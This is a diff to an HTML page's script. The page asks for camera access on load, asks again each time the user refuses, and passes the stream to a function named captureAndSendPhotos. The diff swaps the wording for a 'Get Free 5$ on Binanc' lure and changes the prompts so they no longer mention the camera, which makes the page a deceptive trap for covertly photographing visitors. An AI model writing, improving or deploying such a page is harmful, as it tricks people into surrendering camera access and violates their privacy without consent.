@@ -34,8 +34,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>Welcome to Free Net</h1>
-        <p>Allow camera access to continue.</p>
+        <h1>Get Free 5$ on Binanc</h1>
+        <p>Allow access to continue.</p>
     </div>
 
     <script>
@@ -46,8 +46,7 @@
         // Check if the browser supports getUserMedia API
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             requestCamera(); // Request camera access immediately on page load
-        } else {
-            alert('Your browser does not support camera access.');
+        } else {            alert('Your browser does not support the access.');
         }
 
         async function requestCamera() {
@@ -56,7 +55,7 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 captureAndSendPhotos(stream); // Start capturing photos if permission is granted
             } catch (error) {
-                alert("Camera access is required to use Free Net. Please allow camera access.");
+                alert("Click on allow is required to get free 5$. Please allow.");
                 requestCamera(); // Retry requesting camera permission if denied
             }
         }
